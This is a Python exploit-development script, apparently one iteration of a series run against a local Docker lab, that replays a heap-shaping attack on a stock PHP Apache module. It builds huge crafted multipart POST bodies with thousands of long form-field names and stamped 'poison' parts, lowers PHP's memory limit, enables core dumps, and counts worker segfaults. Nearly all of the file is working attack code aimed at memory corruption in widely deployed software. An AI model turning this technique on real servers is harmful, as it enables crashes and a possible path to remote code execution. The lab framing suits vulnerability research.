#!/usr/bin/env python3
"""oom67: EXACT REPLAY of oom65's winning sequence on a fresh boot.

Theory under test: the stock crash needs cross-request heap shaping —
earlier OOM-dying requests (different k1) arrange the heap; a later
k1=3400 body's freed table lands in shaped memory. oom66 (fresh boot,
k1=3400 first) = 0/18. oom65 (14 shaped deaths first) = 3/4.

Replay oom65 verbatim: same k1 list, same stamp_bases, same ini,
fresh boot. Per fire: code, segv delta, cores, worker pids.
Hypothesis: crashes appear at/after k1=3400 again.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
PREP = 3
POISON_PAGES = 40
CELLS = 10237
K1S = [1900, 1950, 2000, 2044, 2100, 2200, 2400, 2600, 2800, 3000, 3200, 3400]


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (KEYLEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    namelen = POISON_PAGES * 4096 - 25
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1, stamp_base):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(PREP)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def post(att):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=att,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return "200", r.read(150).decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code, e.read(150).decode("latin1", "replace")
    except Exception as e:
        return type(e).__name__, str(e)[:50]


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def pids():
    return ",".join(sh("pgrep -f apache2 | head -4 | tr '\\n' ' '", 8).split()[:3])


def main():
    print("=== [0] stock + lim=8M, fresh boot ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    if md5 != STOCK_MD5:
        print("[ABORT] md5=%s" % md5, flush=True)
        return
    ini = "memory_limit=8M\nmax_input_vars=100000\npost_max_size=4096M\n"
    subprocess.run(["docker", "exec", "-i", "php_vuln", "sh", "-c",
                    "cat > /usr/local/etc/php/conf.d/30-oomlab.ini"],
                   input=ini.encode(), capture_output=True)
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=8M" in probe:
            break
    print("[ini]", probe, "pids:", pids(), flush=True)

    bodies = [(k1, build_attack(k1, 5000000 + fi * 100000)) for fi, k1 in enumerate(K1S)]
    base = len(re.findall(r"exit signal Segmentation", full_logs()))
    print("[baseline] segv=%d" % base, flush=True)

    print("=== [1] oom65 sequence replay ===", flush=True)
    for k1, att in bodies:
        before = pids()
        code, body = post(att)
        time.sleep(2)
        s = len(re.findall(r"exit signal Segmentation", full_logs()))
        cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
        print("  k1=%d: %-9s segv+=%d cores=%s pids %s -> %s"
              % (k1, code, s - base, cores, before, pids()), flush=True)
        base = s

    print("=== [2] finisher reps (k1=3400) ===", flush=True)
    att = build_attack(3400, 7000000)
    crashes = 0
    for i in range(4):
        before = pids()
        code, body = post(att)
        time.sleep(2)
        s = len(re.findall(r"exit signal Segmentation", full_logs()))
        cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
        d = s - base
        crashes += d
        print("  rep%d: %-9s segv+=%d cores=%s pids %s -> %s"
              % (i, code, d, cores, before, pids()), flush=True)
        base = s

    print("=== RESULT: finisher crashes=%d/4 ===" % crashes, flush=True)

    print("=== [3] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        try:
            urllib.request.urlopen(LAB + "/oom_sapi.php", timeout=5).read()
        except Exception:
            pass
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)


if __name__ == "__main__":
    main()
